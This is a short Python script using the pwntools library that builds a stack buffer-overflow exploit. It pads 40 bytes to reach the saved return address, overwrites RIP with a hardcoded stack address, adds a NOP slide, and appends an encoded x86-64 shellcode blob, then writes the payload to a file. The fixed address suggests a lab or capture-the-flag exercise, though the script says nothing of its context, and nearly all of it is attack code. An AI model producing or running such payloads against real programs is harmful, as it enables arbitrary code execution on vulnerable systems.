import pwn

FILE_PATH = "shellcode"
ADDRESS_SHELLCODE = 0x7fffffffdc38
OFFSET_RIP = 40
NOP_SLIDE = b"\x90" * 16  # NOP slide

def create_shellcode():
    """Create the shellcode."""
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
    buf += b"\x05\xef\xff\xff\xff\x48\xbb\xc9\x5d\x2a\x6e\x2c"
    buf += b"\xdc\x8d\xf4\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    buf += b"\xff\xe2\xf4\xa3\x74\x72\xf7\x46\xde\xd2\x9e\xc8"
    buf += b"\x03\x25\x6b\x64\x4b\xc5\x4d\xcb\x5d\x3b\x32\x53"
    buf += b"\xdc\x8d\xf5\x98\x15\xa3\x88\x46\xcc\xd7\x9e\xe3"
    buf += b"\x05\x25\x6b\x46\xdf\xd3\xbc\x36\x93\x40\x4f\x74"
    buf += b"\xd3\x88\x81\x3f\x37\x11\x36\xb5\x94\x36\xdb\xab"
    buf += b"\x34\x44\x41\x5f\xb4\x8d\xa7\x81\xd4\xcd\x3c\x7b"
    buf += b"\x94\x04\x12\xc6\x58\x2a\x6e\x2c\xdc\x8d\xf4"
    return buf

def create_overflow():
    """Create the overflow for RIP."""
    return b"A"*OFFSET_RIP + pwn.p64(ADDRESS_SHELLCODE)

def create_payload():
    """Create the payload."""
    return create_overflow() + NOP_SLIDE + create_shellcode()

def write_payload_to_file(payload):
    """Write the payload to a file."""
    with open(FILE_PATH, 'wb') as file:
        file.write(payload)

def main():
    """Main function."""
    payload = create_payload()
    write_payload_to_file(payload)
    print(pwn.p64(ADDRESS_SHELLCODE))
    print(len(payload))

if __name__ == "__main__":
    main()